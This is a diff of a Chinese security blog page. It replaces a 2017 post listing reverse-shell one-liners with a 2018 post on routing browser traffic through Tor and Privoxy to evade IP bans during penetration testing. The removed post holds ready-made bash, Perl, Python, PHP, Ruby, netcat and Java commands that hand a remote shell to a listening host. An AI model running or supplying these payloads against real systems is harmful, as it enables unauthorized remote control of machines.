@@ -6,19 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://bypupil.github.io">
-  <title>不会这几条命令，如何内网搅屎 | ByPupil&#39;s blog</title>
+  <title>Tor+Privoxy实现匿名 | ByPupil&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x00 前言昨天晚上11点的时候，学长跟我说Python的官网的在线shell存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在Python官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。 这篇文章当然不是来讲Python网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的Linux">
-<meta name="keywords" content="Linux">
+  <meta name="description" content="0x00 前言渗透测试过程中，最让我寒心的是。仅仅测试了单引号，就把我ip拉黑。接下来就是用大量的代理进行测试，如果代理ip很少。那么就不能在继续渗透你的站点。通过搜索引擎发现一个神器 – Tor。 0x01 神器介绍No.1-Tor官方介绍：Tor是免费软件和开放网络，它帮助您抵御流量分析，威胁个人自由和隐私、机密商业活动和关系以及国家安全的网络监视形式。俗话：Tor可以在不还钱的情况下保护个人">
+<meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
-<meta property="og:title" content="不会这几条命令，如何内网搅屎">
-<meta property="og:url" content="https://bypupil.github.io/2017/09/23/不会这几条命令，如何内网搅屎/index.html">
+<meta property="og:title" content="Tor+Privoxy实现匿名">
+<meta property="og:url" content="https://bypupil.github.io/2018/03/12/Tor-Privoxy实现匿名/index.html">
 <meta property="og:site_name" content="ByPupil&#39;s blog">
-<meta property="og:description" content="0x00 前言昨天晚上11点的时候，学长跟我说Python的官网的在线shell存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在Python官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。 这篇文章当然不是来讲Python网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的Linux">
-<meta property="og:updated_time" content="2017-09-23T15:43:56.000Z">
+<meta property="og:description" content="0x00 前言渗透测试过程中，最让我寒心的是。仅仅测试了单引号，就把我ip拉黑。接下来就是用大量的代理进行测试，如果代理ip很少。那么就不能在继续渗透你的站点。通过搜索引擎发现一个神器 – Tor。 0x01 神器介绍No.1-Tor官方介绍：Tor是免费软件和开放网络，它帮助您抵御流量分析，威胁个人自由和隐私、机密商业活动和关系以及国家安全的网络监视形式。俗话：Tor可以在不还钱的情况下保护个人">
+<meta property="og:image" content="https://bypupil.github.io/2018/03/12/Tor-Privoxy实现匿名/1.png">
+<meta property="og:updated_time" content="2018-03-11T17:26:13.490Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="不会这几条命令，如何内网搅屎">
-<meta name="twitter:description" content="0x00 前言昨天晚上11点的时候，学长跟我说Python的官网的在线shell存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在Python官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。 这篇文章当然不是来讲Python网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的Linux">
+<meta name="twitter:title" content="Tor+Privoxy实现匿名">
+<meta name="twitter:description" content="0x00 前言渗透测试过程中，最让我寒心的是。仅仅测试了单引号，就把我ip拉黑。接下来就是用大量的代理进行测试，如果代理ip很少。那么就不能在继续渗透你的站点。通过搜索引擎发现一个神器 – Tor。 0x01 神器介绍No.1-Tor官方介绍：Tor是免费软件和开放网络，它帮助您抵御流量分析，威胁个人自由和隐私、机密商业活动和关系以及国家安全的网络监视形式。俗话：Tor可以在不还钱的情况下保护个人">
+<meta name="twitter:image" content="https://bypupil.github.io/2018/03/12/Tor-Privoxy实现匿名/1.png">
   
     <link rel="alternative" href="/atom.xml" title="ByPupil&#39;s blog" type="application/atom+xml">
   
@@ -154,51 +156,32 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-不会这几条命令，如何内网搅屎" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Tor-Privoxy实现匿名" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      不会这几条命令，如何内网搅屎
+      Tor+Privoxy实现匿名
     </h1>
   
 
         
-        <a href="/2017/09/23/不会这几条命令，如何内网搅屎/" class="archive-article-date">
-  	<time datetime="2017-09-23T08:25:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-23</time>
+        <a href="/2018/03/12/Tor-Privoxy实现匿名/" class="archive-article-date">
+  	<time datetime="2018-03-11T16:31:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-12</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>昨天晚上11点的时候，学长跟我说<code>Python</code>的官网的在线<code>shell</code>存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在<code>Python</code>官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。</p>
-<p>这篇文章当然不是来讲<code>Python</code>网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的<code>Linux下反弹shell的方法</code>。</p>
-<h2 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h2><p>愚人废话在多说一点，毕竟要反弹shell，所以远程主机上一定要有一些工具或者脚本才能完成这个流程。如果没有这些工具或者脚本，在一些可能的情况下，依然可以将其上传到远程主机上。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Kali 2.0 — 2017/2</div><div class="line">Debian 7.0x64</div></pre></td></tr></table></figure>
-<h2 id="0x02-常用的工具及脚本"><a href="#0x02-常用的工具及脚本" class="headerlink" title="0x02 常用的工具及脚本"></a>0x02 常用的工具及脚本</h2><p>控制端主机：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -l -p 1234 -vvv</div></pre></td></tr></table></figure>
-<p><strong>Bash</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/&lt;Target_IP&gt;/&lt;Port&gt; 0&gt;&amp;1</div></pre></td></tr></table></figure>
-<p><strong>Perl</strong></p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use </span></div><div class="line"><span class="string">Socket;$i="&lt;Target_IP&gt;";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))</span></div><div class="line"><span class="string">&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></div></pre></td></tr></table></figure>
-<p><strong>Python</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;Target_IP&gt;",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></div></pre></td></tr></table></figure>
-<p><strong>PHP</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("&lt;Target_IP&gt;",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure>
-<p><strong>Ruby</strong></p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("&lt;Target_IP&gt;",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></div></pre></td></tr></table></figure>
-<p>Ruby这个测试了多次一直没有成功。</p>
-<p><strong>NetCat</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh &lt;Target_IP&gt; 1234</div></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;Target_IP&gt; 1234 &gt;/tmp/f</div></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc &lt;Target_IP&gt; 8888|/bin/sh|nc &lt;Target_IP&gt; 9999</div></pre></td></tr></table></figure>
-<p><strong>Java</strong></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.8.31/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure>
-<p>java版本的，我也没测试成功。本人太愚。</p>
-<h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">Reverse Shell Cheat Sheet</a><br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="external">Linux下反弹shell方法</a><br><a href="http://www.linuxidc.com/Linux/2016-11/136993.htm" target="_blank" rel="external">Linux里的2&gt;&amp;1究竟是什么</a></p>
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>渗透测试过程中，最让我寒心的是。仅仅测试了单引号，就把我ip拉黑。接下来就是用大量的代理进行测试，如果代理ip很少。那么就不能在继续渗透你的站点。通过搜索引擎发现一个神器 – Tor。</p>
+<h2 id="0x01-神器介绍"><a href="#0x01-神器介绍" class="headerlink" title="0x01 神器介绍"></a>0x01 神器介绍</h2><p><strong>No.1-Tor</strong><br>官方介绍：Tor是免费软件和开放网络，它帮助您抵御流量分析，威胁个人自由和隐私、机密商业活动和关系以及国家安全的网络监视形式。<br>俗话：Tor可以在不还钱的情况下保护个人隐私。<br><a href="https://www.torproject.org/" target="_blank" rel="external">官方</a></p>
+<p><strong>No.2-Privoxy</strong><br>官方介绍：Privoxy是一款带过滤功能的代理服务器，针对HTTP、HTTPS协议。通过Privoxy的过滤功能，用户可以保护隐私、对网页内容进行过滤、管理cookies，以及拦阻各种广告等。Privoxy可以用作单机，也可以应用到多用户的网络。<br>俗话：将socks代理转换成为http代理和广告过滤的工具。<br><a href="https://www.privoxy.org/" target="_blank" rel="external">官方</a></p>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>Tor和Privoxy的安装过程在此不在讲解.安装Tor后，如果使用TorBrowser工具就已经可以做到访问任意网页时，每次的ip都是随机的。接下来主要讲解如何让系统中的所有浏览器都走Tor代理流量。<br><strong>OSX</strong><br>在查找资料的时候遇到了一个坑，配置Privoxy的时，<code>forward-socks4a</code>的本地端口会填写<code>9050</code>。然而在实际测试的时候，这个端口其实是不开放的，真正开放的端口是<code>9150</code>。<br>Privoxy配置文件路径：<code>/usr/local/etc/privoxy/config</code>。在配置中添加如下命令：<br><code>forward-socks4a / 127.0.0.1:9050 .</code><br>其实<code>forward-socks4a</code>是命令项，<code>/</code>表示对所有站点进行同样的配置，<code>127.0.0.1:9050</code>表示代理的是Tor的socks端口。</p>
+<p><strong>注意：</strong><br>该命令最后存在一个<code>.</code>。该点表示没有http设置，如果去掉会报错。<br>下一步是配置网络代理，具体如下图：<br><img src="/2018/03/12/Tor-Privoxy实现匿名/1.png" alt="ByPupil" title="ByPupil"><br>此时，使用任意浏览器都可以在每次访问网页时使用不同IP。</p>
+<h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p><a href="http://www.cppblog.com/riverbeast/archive/2007/11/18/36866.html" target="_blank" rel="external">Tor+Privoxy黄金搭档</a><br><a href="http://www.cppblog.com/riverbeast/archive/2007/11/18/36869.html" target="_blank" rel="external">单独使用Privoxy</a><br><a href="http://thehiddenwiki.org/" target="_blank" rel="external">Hidden Wiki .onion Urls Tor Link Directory</a></p>
 
       
 
@@ -233,7 +216,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
         		</li>
       		
 		</ul>
@@ -289,7 +272,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=https://bypupil.github.io/2017/09/23/不会这几条命令，如何内网搅屎/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://bypupil.github.io/2018/03/12/Tor-Privoxy实现匿名/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -303,18 +286,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/09/24/不会编程的大四狗/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          不会编程的大四狗
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/09/18/CVE-2017-9603-分析/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CVE-2017-9603 分析</div>
+    <a href="/2017/12/11/WSL初体验/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">WSL初体验</div>
       <i class="icon-circle-right"></i>
     </a>
   
